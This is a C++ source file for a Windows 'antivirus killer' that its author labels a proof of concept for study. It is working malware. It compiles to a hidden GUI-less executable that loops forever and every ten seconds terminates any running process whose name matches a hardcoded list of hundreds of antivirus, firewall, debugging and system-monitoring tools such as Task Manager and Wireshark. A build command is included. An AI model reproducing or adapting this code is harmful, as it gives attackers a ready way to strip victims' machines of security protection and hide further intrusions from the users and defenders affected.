/*
Proof of concept to avKiller

to compile:
	g++ -I"C:\MinGW\include" -L"C:\MinGW\lib" -mwindows -s -o jasonkiller.exe jasonkiller.cpp -O3 -static-libgcc -static-libstdc++

Only Study purpose...

Antivirus Killer/ firewall killer, ia a malicious tool used to disable a user's antivirus program to help elude detection. AV killers may also attempt to disable firewalls and another protections...


coolerlair@gmail.com
CoolerVoid

*/
#include <iostream>
#include <string>
#include <stdio.h>
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>

using namespace std;

// kill the process per name
void kill_corpse(const char *filename)
{
	HANDLE killer_SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 process_entry;
	process_entry.dwSize = sizeof (process_entry);
	BOOL carry = Process32First(killer_SnapShot, &process_entry);

	while (carry)
	{
		if (strcmp(process_entry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,(DWORD) process_entry.th32ProcessID);
            		if (hProcess != NULL)
            		{
                		TerminateProcess(hProcess, 9);
                		CloseHandle(hProcess);
            		}
        	}

        	carry = Process32Next(killer_SnapShot, &process_entry);
    	}

    	CloseHandle(killer_SnapShot);
}

void jasonkiller()
{
	int i=0;
// 584 process names of antivirus, firewalls n another protectors to bring the fall
	std::string listavs[] = {"AvastUI","AvastSvc.exe","TmListen.exe","McShield.exe","wireshark.exe","aAvgApi.exe","AAWTray.exe","ackwin32.exe","adaware.exe","Ad-Aware.exe","advxdwin.exe","agentsvr.exe","agentw.exe","alertsvc.exe","alevir.exe","alogserv.exe","amon9x.exe","anti-trojan.exe","antivirus.exe","ants.exe","apimonitor.exe","aplica32.exe","apvxdwin.exe","arr.exe","atcon.exe","atguard.exe","atro55en.exe","atupdater.exe","atwatch.exe","au.exe","aupdate.exe","autodown.exe","auto-protect.nav80try.exe","autotrace.exe","autoupdate.exe","avconsol.exe","ave32.exe","avgcc32.exe","avgctrl.exe","avgemc.exe","avgnt.exe","avgrsx.exe","avgserv9.exe","avgserv.exe","avguard.exe","avgw.exe","avkpop.exe","avkserv.exe","avkservice.exe","avkwctl9.exe","avltmain.exe","avnt.exe","_avp32.exe","avp32.exe","_avpcc.exe","avpcc.exe","avpdos32.exe","avp.exe","_avpm.exe","avpm.exe","avptc32.exe","avpupd.exe","avsched32.exe","avsynmgr.exe","avwin95.exe","avwin.exe","avwinnt.exe","avwupd32.exe","avwupd.exe","avwupsrv.exe","avxmonitor9x.exe","avxmonitornt.exe","avxquar.exe","backweb.exe","bargains.exe","bd_professional.exe","beagle.exe","belt.exe","bidef.exe","bidserver.exe","bipcpevalsetup.exe","bipcp.exe","bisp.exe","blackd.exe","blackice.exe","blink.exe","blss.exe","bootconf.exe","bootwarn.exe","borg2.exe","bpc.exe","brasil.exe","bs120.exe","bundle.exe","bvt.exe","ccapp.exe","ccevtmgr.exe","ccpxysvc.exe","cdp.exe","cfd.exe","cfgwiz.exe","cfiadmin.exe","cfiaudit.exe","cfinet32.exe","cfinet.exe","claw95cf.exe","claw95.exe","cleaner3.exe","cleaner.exe","clean.exe","cleanpc.exe","click.exe","cmd32.exe","cmesys.exe","cmgrdian.exe","cmon016.exe","connectionmonitor.exe","cpd.exe","cpf9x206.exe","cpfnt206.exe","ctrl.exe","cv.exe","cwnb181.exe","cwntdwmo.exe","datemanager.exe","dcomx.exe","defalert.exe","defscangui.exe","defwatch.exe","deputy.exe","divx.exe","dllcache.exe","dllreg.exe","doors.exe","dpf.exe","dpfsetup.exe","dpps2.exe","drwatson.exe","drweb32.exe","drwebupw.exe","dssagent.exe","dvp95_0.exe","dvp95.exe","ecengine.exe","efpeadm.exe","emsw.exe","ent.exe","esafe.exe","escanhnt.exe","escanv95.exe","espwatch.exe","ethereal.exe","etrustcipe.exe","evpn.exe","exantivirus-cnet.exe","exe.avxw.exe","expert.exe","explore.exe","f-agnt95.exe","fameh32.exe","fast.exe","fch32.exe","fih32.exe","findviru.exe","firewall.exe","fnrb32.exe","f-prot95.exe","f-prot.exe","fprot.exe","fp-win.exe","fp-win_trial.exe","frw.exe","fsaa.exe","fsav32.exe","fsav530stbyb.exe","fsav530wtbyb.exe","fsav95.exe","fsav.exe","fsgk32.exe","fsm32.exe","fsma32.exe","fsmb32.exe","f-stopw.exe","gator.exe","gbmenu.exe","gbpoll.exe","generics.exe","gmt.exe","guarddog.exe","guard.exe","hacktracersetup.exe","hbinst.exe","hbsrv.exe","hotactio.exe","hotpatch.exe","htlog.exe","htpatch.exe","hwpe.exe","hxdl.exe","hxiul.exe","iamapp.exe","iamserv.exe","iamstats.exe","ibmasn.exe","ibmavsp.exe","icload95.exe","icloadnt.exe","icmon.exe","icsupp95.exe","icsuppnt.exe","idle.exe","iedll.exe","iedriver.exe","iexplorer.exe","iface.exe","ifw2000.exe","inetlnfo.exe","infus.exe","infwin.exe","init.exe","intdel.exe","intren.exe","iomon98.exe","istsvc.exe","jammer.exe","jdbgmrg.exe","jedi.exe","kavlite40eng.exe","kavpers40eng.exe","kavpf.exe","kazza.exe","keenvalue.exe","kerio-pf-213-en-win.exe","kerio-wrl-421-en-win.exe","kerio-wrp-421-en-win.exe","kernel32.exe","killprocesssetup161.exe","launcher.exe","ldnetmon.exe","ldpro.exe","ldpromenu.exe","ldscan.exe","lnetinfo.exe","loader.exe","localnet.exe","lockdown2000.exe","lockdown.exe","lookout.exe","lordpe.exe","lsetup.exe","luall.exe","luau.exe","lucomserver.exe","luinit.exe","luspt.exe","mapisvc32.exe","mcagent.exe","mcmnhdlr.exe","mcshield.exe","mctool.exe","mcupdate.exe","mcvsrte.exe","mcvsshld.exe","md.exe","mfin32.exe","mfw2en.exe","mfweng3.02d30.exe","mgavrtcl.exe","mgavrte.exe","mghtml.exe","mgui.exe","minilog.exe","mmod.exe","monitor.exe","moolive.exe","mostat.exe","mpfagent.exe","mpfservice.exe","mpftray.exe","mrflux.exe","msapp.exe","MSASCui.exe","msbb.exe","msblast.exe","mscache.exe","msccn32.exe","mscman.exe","msconfig.exe","msdm.exe","msdos.exe","msiexec16.exe","msinfo32.exe","mslaugh.exe","msmgt.exe","msmsgri32.exe","mssmmc32.exe","mssys.exe","msvxd.exe","mu0311ad.exe","mwatch.exe","n32scanw.exe","navap.navapsvc.exe","navapsvc.exe","navapw32.exe","navdx.exe","nav.exe","navlu32.exe","navnt.exe","navstub.exe","navw32.exe","navwnt.exe","nc2000.exe","ncinst4.exe","ndd32.exe","neomonitor.exe","neowatchlog.exe","netarmor.exe","netd32.exe","netinfo.exe","netmon.exe","netscanpro.exe","netspyhunter-1.2.exe","netstat.exe","netutils.exe","nisserv.exe","nisum.exe","nmain.exe","nod32.exe","normist.exe","norton_internet_secu_3.0_407.exe","notstart.exe","npf40_tw_98_nt_me_2k.exe","npfmessenger.exe","nprotect.exe","npscheck.exe","npssvc.exe","nsched32.exe","nssys32.exe","nstask32.exe","nsupdate.exe","nt.exe","ntrtscan.exe","ntvdm.exe","ntxconfig.exe","nui.exe","nupgrade.exe","nvarch16.exe","nvc95.exe","nvsvc32.exe","nwinst4.exe","nwservice.exe","nwtool16.exe","ollydbg.exe","onsrvr.exe","optimize.exe","ostronet.exe","otfix.exe","outpost.exe","outpostinstall.exe","outpostproinstall.exe","padmin.exe","panixk.exe","patch.exe","pavcl.exe","pavproxy.exe","pavsched.exe","pavw.exe","pccwin98.exe","pcfwallicon.exe","pcip10117_0.exe","pcscan.exe","pdsetup.exe","periscope.exe","persfw.exe","perswf.exe","pf2.exe","pfwadmin.exe","pgmonitr.exe","pingscan.exe","platin.exe","pop3trap.exe","poproxy.exe","popscan.exe","portdetective.exe","portmonitor.exe","powerscan.exe","ppinupdt.exe","pptbc.exe","ppvstop.exe","prizesurfer.exe","prmt.exe","prmvr.exe","procdump.exe","processmonitor.exe","procexplorerv1.0.exe","programauditor.exe","proport.exe","protectx.exe","pspf.exe","purge.exe","qconsole.exe","qserver.exe","rapapp.exe","rav7.exe","rav7win.exe","rav8win32eng.exe","ray.exe","rb32.exe","rcsync.exe","realmon.exe","reged.exe","regedit.exe","regedt32.exe","rescue32.exe","rescue.exe","rrguard.exe","rshell.exe","rtvscan.exe","rtvscn95.exe","rulaunch.exe","run32dll.exe","rundll16.exe","rundll.exe","ruxdll32.exe","safeweb.exe","sahagent.exe","save.exe","savenow.exe","sbserv.exe","scam32.exe","scan32.exe","scan95.exe","scanpm.exe","sc.exe","scrscan.exe","serv95.exe","setup_flowprotector_us.exe","setupvameeval.exe","sfc.exe","sgssfw32.exe","shellspyinstall.exe","sh.exe","shn.exe","showbehind.exe","smc.exe","sms.exe","smss32.exe","soap.exe","sofi.exe","sperm.exe","spf.exe","sphinx.exe","spoler.exe","spoolcv.exe","spoolsv32.exe","spyxx.exe","srexe.exe","srng.exe","ss3edit.exe","ssg_4104.exe","ssgrate.exe","st2.exe","start.exe","stcloader.exe","supftrl.exe","supporter5.exe","support.exe","svc.exe","svchostc.exe","svchosts.exe","svshost.exe","sweep95.exe","sweepnet.sweepsrv.sys.swnetsup.exe","symproxysvc.exe","symtray.exe","sysedit.exe","system32.exe","system.exe","sysupd.exe","taskmg.exe","taskmgr.exe","taskmo.exe","taskmon.exe","taumon.exe","tbscan.exe","tca.exe","tc.exe","tcm.exe","tds2-98.exe","tds2-nt.exe","tds-3.exe","teekids.exe","tfak5.exe","tfak.exe","tgbob.exe","titanin.exe","titaninxp.exe","tracert.exe","trickler.exe","trjscan.exe","trjsetup.exe","trojantrap3.exe","tsadbot.exe","tvmd.exe","tvtmd.exe","undoboot.exe","update.exe","updat.exe","upgrad.exe","utpost.exe","vbcmserv.exe","vbcons.exe","vbust.exe","vbwin9x.exe","vbwinntw.exe","vcsetup.exe","vet32.exe","vet95.exe","vettray.exe","vfsetup.exe","vir-help.exe","virusmdpersonalfirewall.exe","vnlan300.exe","vnpc3000.exe","vpc32.exe","vpc42.exe","vpfw30s.exe","vptray.exe","vscan40.exe","vscenu6.02d30.exe","vsched.exe","vsecomr.exe","vshwin32.exe","vsisetup.exe","vsmain.exe","vsmon.exe","vsstat.exe","vswin9xe.exe","vswinntse.exe","vswinperse.exe","w32dsm89.exe","w9x.exe","watchdog.exe","webdav.exe","webscanx.exe","webtrap.exe","wfindv32.exe","whoswatchingme.exe","wimmun32.exe","win32.exe","win32us.exe","winactive.exe","win-bugsfix.exe","window.exe","windows.exe","wininetd.exe","wininitx.exe","winlogin.exe","winmain.exe","winnet.exe","winppr32.exe","winrecon.exe","winservn.exe","winssk32.exe","winstart001.exe","winstart.exe","wintsk32.exe","winupdate.exe","wkufind.exe","wnad.exe","wnt.exe","wradmin.exe","wrctrl.exe","wsbgate.exe","wupdater.exe","wupdt.exe","wyvernworksfirewall.exe","xpf202en.exe","zapro.exe","zapsetup3001.exe","zatutor.exe","zonalm2601.exe","zonealarm.exe","GbpSv.exe","core.exe"};

	while (i < sizeof listavs / sizeof *listavs)
	{
//debug		cout << listavs[i] << "\n";
		kill_corpse(listavs[i].c_str());
		i++;
	}

}

 	

// runs hidden mode
int WINAPI WinMain(HINSTANCE inst,HINSTANCE prev,LPSTR cmd,int show)
{
	char * memdirt = NULL;

	while(1)
	{
		memdirt = (char *) malloc(1000000);

		if(memdirt!=NULL)
		{
// write dirt in heap
			memset(memdirt,66, 1000000);
			free(memdirt);
			// kill any process of blacklist
 			jasonkiller();
		}
// wait  secs to kill again
		Sleep(10000); 
	}

	exit(0);
}
